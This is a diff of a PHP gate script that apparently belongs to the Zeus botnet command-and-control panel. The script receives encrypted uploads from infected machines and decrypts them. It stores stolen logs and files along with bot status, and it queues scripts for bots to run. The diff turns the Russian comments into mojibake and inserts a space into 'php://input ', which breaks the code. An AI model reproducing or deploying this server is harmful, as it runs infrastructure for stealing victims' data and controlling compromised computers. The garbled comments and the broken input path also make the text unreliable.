@@ -11,18 +11,18 @@ if(@$_SERVER['REQUEST_METHOD'] !== 'POST')die();
 require_once('system/global.php');
 require_once('system/config.php');
 
-//Получаем данные.
-$data     = @file_get_contents('php://input');
+//RџRѕR "SѓS ‡ P ° ° RμRј RґR RЅRЅS <Rμ.
+$data     = @file_get_contents('php://input ');
 $dataSize = @strlen($data);
 if($dataSize < HEADER_SIZE + ITEM_HEADER_SIZE)die();
 rc4($data, $config['botnet_cryptkey_bin']);
 visualDecrypt($data);
 
-//Верефикация. Если совпадает MD5, нет смысла проверять, что-то еще.
+//R'RμSЂRμS "ReRєR ° C † ReSЏ. P • SЃR "Re SЃRѕRІRїR ° ° RґR RμS, MD5, RЅRμS, SЃRјS <SЃR" P ° RїSЂRѕRІRμSЂSЏS, SЊ, C ‡ C Rѕ-C Rѕ RμS ‰ Rμ.
 if(strcmp(md5(substr($data, HEADER_SIZE), true), substr($data, HEADER_MD5, 16)) !== 0)die();
 
-//Парсим данные (Сжатие данных не поддерживается).
-//Поздравляю мега хакеров, этот алгоритм позволит вам спокойно читать данные бота. Не забудьте написать 18 парсеров и 100 бэкдоров.
+//RџR ° SЂSЃReRј RґR ° RЅRЅS <Rμ (RЎR ¶ P ° C ° ReRμ RґR RЅRЅS <C ... RЅRμ RїRѕRґRґRμSЂR ¶ ° ReRІR RμS, SЃSЏ).
+//RџRѕR · RґSЂR ° RІR "SЏSЋ RјRμRіR ° C ... P ° RєRμSЂRѕRІ, SЌS, RѕS, P ° P" RіRѕSЂReS, Rј RїRѕR · RІRѕR "Res, RІR ° Rј SЃRїRѕRєRѕR number RЅRѕ C ‡ Res, P ° C ° SЊ RґR RЅRЅS <Rμ ± RѕS P, P °. RќRμ P · P ° P ± SѓRґSЊS, Rμ RЅR ° RїReSЃR ° C SЊ 18 ° RїR SЂSЃRμSЂRѕRІ Pe 100 R ± SЌRєRґRѕSЂRѕRІ.
 $list = array();
 for($i = HEADER_SIZE; $i < $dataSize;)
 {
@@ -32,15 +32,15 @@ for($i = HEADER_SIZE; $i < $dataSize;)
 }
 unset($data);
 
-//Основные параметры, которые должны быть всегда.
+//RћSЃRЅRѕRІRЅS <Rμ RїR ° ° SЂR RјRμS, SЂS <RєRѕS, RѕSЂS <Rμ RґRѕR "P ¶ RЅS <P ± C <, SЊ RІSЃRμRіRґR °.
 if(empty($list[SBCID_BOT_VERSION]) || empty($list[SBCID_BOT_ID]))die();
 
-//Подключаемся к базе.
+//RџRѕRґRєR "SЋS ‡ P ° RμRјSЃSЏ Rє P ± P ° P · Rμ.
 if(!connectToDb())die();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Обрабатываем данные.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// RћR SЂR ° ± P ± P ° C, C <RІR ° RμRј RґR ° RЅRЅS <Rμ.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 $botId      = str_replace("\x01", "\x02", trim($list[SBCID_BOT_ID]));
 $botIdQ     = addslashes($botId);
@@ -48,11 +48,11 @@ $botnet     = (empty($list[SBCID_BOTNET])) ? DEFAULT_BOTNET : str_replace("\x01"
 $botnetQ    = addslashes($botnet);
 $botVersion = toUint($list[SBCID_BOT_VERSION]);
 $realIpv4   = trim((!empty($_GET['ip']) ? $_GET['ip'] : $_SERVER['REMOTE_ADDR']));
-$country    = getCountryIpv4(); //str_replace("\x01", "\x02", GetCountryIPv4());
+$country    = getCountryIpv4(); //str_replace ("\ x01", "\ x02", GetCountryIPv4 ());
 $countryQ   = addslashes($country);
 $curTime    = time();
 
-//Отчет об исполнении скрипта.
+//RћS, C ‡ RμS, RѕR ± ReSЃRїRѕR "RЅRμRЅReRe SЃRєSЂReRїS, P °.
 if(!empty($list[SBCID_SCRIPT_ID]) && isset($list[SBCID_SCRIPT_STATUS], $list[SBCID_SCRIPT_RESULT]) && strlen($list[SBCID_SCRIPT_ID]) == 16)
 {
   if(!mysqlQueryEx('botnet_scripts_stat',
@@ -61,19 +61,19 @@ if(!empty($list[SBCID_SCRIPT_ID]) && isset($list[SBCID_SCRIPT_STATUS], $list[SBC
                    "`type`=".(toInt($list[SBCID_SCRIPT_STATUS]) == 0 ? 2 : 3).",".
                    "`report`='".addslashes($list[SBCID_SCRIPT_RESULT])."'"))die();
 }
-//Запись логов/файлов.
+//P-P ° RїReSЃSЊ R "RѕRіRѕRІ / C" P ° P № R "RѕRІ.
 else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
 {
   $type = toInt($list[SBCID_BOTLOG_TYPE]);
   
   if($type == BLT_FILE)
   {
-    //Расширения, которые представляют возможность удаленного запуска.
+    //P P ° SЃS € ReSЂRμRЅReSЏ, RєRѕS, RѕSЂS <Rμ RїSЂRμRґSЃS, P ° RІR "SЏSЋS, RІRѕR · RјRѕR ¶ RЅRѕSЃS, SЊ SѓRґR ° P" P RμRЅRЅRѕRіRѕ · RїSѓSЃRєR P ° °.
     $bad_exts = array('.php3', '.php4', '.php5', '.php', '.asp', '.aspx', '.exe', '.pl', '.cgi', '.cmd', '.bat', '.phtml', '.htaccess');
     $fd_hash  = 0;
     $fd_size  = strlen($list[SBCID_BOTLOG]);
     
-    //Формируем имя файла.
+    //P ¤ RѕSЂRјReSЂSѓRμRј ReRјSЏ C "P ° P № P" P °.
     if(isHackNameForPath($botId) || isHackNameForPath($botnet))die();
     $file_root = $config['reports_path'].'/files/'.urlencode($botnet).'/'.urlencode($botId);
     $file_path = $file_root;
@@ -87,14 +87,14 @@ else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
     if(strlen($last_name) === 0)$file_path .= '/unknown.dat';
     unset($l);
     
-    //Проверяем расширении, и указываем маску файла.
+    //RџSЂRѕRІRμSЂSЏRμRј SЂR ° SЃS € ReSЂRμRЅReRe, Fe SѓRєR ° F · C <RІR ° RμRј RјR SЃRєSѓ ° C "P ° P № P" P °.
     if(($ext = strrchr($last_name, '.')) === false || in_array(strtolower($ext), $bad_exts) !== false)$file_path .= '.dat';
     $ext_pos = strrpos($file_path, '.');
     
-    //FIXME: Если имя слишком большое.
+    //FIXME: P • SЃR "Re ReRјSЏ SЃR" Res RєRѕRј € P ± RѕR "SЊS € RѕRμ.
     if(strlen($file_path) > 180)$file_path = $file_root.'/longname.dat';
     
-    //Добавляем файл.
+    //P RѕR ± P ° RІR "SЏRμRј C" P ° P № P ".
     for($i = 0; $i < 9999; $i++)
     { 
       if($i == 0)$f = $file_path;
@@ -123,7 +123,7 @@ else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
   }
   else
   {
-    //Запись в базу.
+    //P-P ° RїReSЃSЊ RІ P ± P ° P · Sѓ.
     if($config['reports_to_db'] === 1)
     {
       $table = 'botnet_reports_'.gmdate('ymd', $curTime);
@@ -140,11 +140,11 @@ else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
                "ipv4='".          addslashes($realIpv4)."',".
                "context='".       addslashes($list[SBCID_BOTLOG])."'";
 
-      //Думаю такой порядок повышает производительность.
+      //P SѓRјR SЋ ° C, P ° RєRѕR number RїRѕSЂSЏRґRѕRє RїRѕRІS <C € P ° RμS, RїSЂRѕReR · RІRѕRґReS, RμR "SЊRЅRѕSЃS, SЊ.
       if(!mysqlQueryEx($table, $query) && (!@mysql_query("CREATE TABLE IF NOT EXISTS `{$table}` LIKE `botnet_reports`") || !mysqlQueryEx($table, $query)))die();
     }
     
-    //Запись в файл.
+    //P-P ° RїReSЃSЊ RІ C "P ° P № P".
     if($config['reports_to_fs'] === 1)
     {
       if(isHackNameForPath($botId) || isHackNameForPath($botnet))die();
@@ -160,7 +160,7 @@ else if(!empty($list[SBCID_BOTLOG]) && !empty($list[SBCID_BOTLOG_TYPE]))
                  "country={$country}\r\n".
                  "type={$type}\r\n".
                  "rtime=".         gmdate('H:i:s d.m.Y', $curTime)."\r\n".
-                 "time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : gmdate('H:i:s d.m.Y', toInt($list[SBCID_TIME_SYSTEM])))."\r\n".//time() тоже возращает int.
+                 "time_system=".   (empty($list[SBCID_TIME_SYSTEM])    ? 0  : gmdate('H:i:s d.m.Y', toInt($list[SBCID_TIME_SYSTEM])))."\r\n".//time () C RѕR ¶ Rμ RІRѕR · SЂR ° C ‰ P ° RμS, int.
                  "time_tick=".     (empty($list[SBCID_TIME_TICK])      ? 0  : tickCountToText(toUint($list[SBCID_TIME_TICK]) / 1000))."\r\n".
                  "time_localbias=".(empty($list[SBCID_TIME_LOCALBIAS]) ? 0  : timeBiasToText(toInt($list[SBCID_TIME_LOCALBIAS])))."\r\n".
                  "os_version=".    (empty($list[SBCID_OS_INFO])        ? '' : osDataToString($list[SBCID_OS_INFO]))."\r\n".
@@ -177,10 +177,10 @@ if(configBool('jabber_notifier'))return "   if(\$config['reports_jn'] === 1)imNo
 /*EVAL_END*/
   }
 }
-//Отчет об онлайн-статусе.
+//RћS, C ‡ RμS, RѕR ± RѕRЅR "P ° P № RЅ-SЃS, P ° C SѓSЃRμ.
 else if(!empty($list[SBCID_NET_LATENCY]))
 {
-  //Стандартный запрос.
+  //RЎS, P ° ° RЅRґR SЂS, RЅS <P № P · P ° RїSЂRѕSЃ.
   $query = "`bot_id`='{$botIdQ}', `botnet`='{$botnetQ}', `bot_version`={$botVersion}, `country`='{$countryQ}', `rtime_last`={$curTime}, ".
            "`net_latency`=".   (empty($list[SBCID_NET_LATENCY])    ? 0  : toUint($list[SBCID_NET_LATENCY])).", ".
            "`tcpport_s1`=".    (empty($list[SBCID_TCPPORT_S1])     ? 0  : toUshort($list[SBCID_TCPPORT_S1])).", ".
@@ -196,7 +196,7 @@ else if(!empty($list[SBCID_NET_LATENCY]))
                    "ON DUPLICATE KEY UPDATE `rtime_online`=IF(`rtime_last` <= ".($curTime - $config['botnet_timeout']).", {$curTime}, `rtime_online`), {$query}"))die();
   unset($query);
   
-  //Поиск скриптов для отправки.
+  //RџRѕReSЃRє SЃRєSЂReRїS, RѕRІ RґR "SЏ RѕS, RїSЂR ° RІRєRe.
   $replyData  = '';
   $replyCount = 0;
 
@@ -218,14 +218,14 @@ else if(!empty($list[SBCID_NET_LATENCY]))
   {
     $eid = addslashes($m[0]);
     
-    //Проверяем, не достигнут ли лимит.
+    //RџSЂRѕRІRμSЂSЏRμRј, RЅRμ RґRѕSЃS, ReRіRЅSѓS, P "Pe P" ReRјReS.
     if($m[2] != 0 && ($j = mysqlQueryEx('botnet_scripts_stat', "SELECT COUNT(*) FROM `botnet_scripts_stat` WHERE `type`=1 AND `extern_id`='{$eid}'")) && ($c = mysql_fetch_row($j)) && $c[0] >= $m[2])
     {
       mysqlQueryEx('botnet_scripts', "UPDATE `botnet_scripts` SET `flag_enabled`=0 WHERE `id`={$m[3]} LIMIT 1");
       continue;
     }
     
-    //Добовляем бота в список отправленных.
+    //P RѕR ± RѕRІR "SЏRμRј P ± RѕS, P ° RІ SЃRїReSЃRѕRє RѕS, RїSЂR ° RІR" RμRЅRЅS <C ....
     if(mysqlQueryEx('botnet_scripts_stat', "INSERT HIGH_PRIORITY INTO `botnet_scripts_stat` SET `extern_id`='{$eid}', `type`=1, `bot_id`='{$botIdQ}', `bot_version`={$botVersion}, `rtime`={$curTime}, `report`='Sended'"))
     {
       $size = strlen($m[1]) + strlen($m[0]);
@@ -244,12 +244,12 @@ else if(!empty($list[SBCID_NET_LATENCY]))
 }
 else die();
 
-//Отправляем пустой ответ.
+//RћS, RїSЂR ° RІR "SЏRμRј RїSѓSЃS, RѕR number RѕS, RІRμS.
 sendEmptyReply();
 
-///////////////////////////////////////////////////////////////////////////////////////////////////
-// Функции.
-///////////////////////////////////////////////////////////////////////////////////////////////////
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
+// P ¤ † SѓRЅRєS ReRe.
+////////////////////////////////////////////////// / / ///////////////////////////////////////////////
 
 /*
   Отправка пустого ответа и выход.
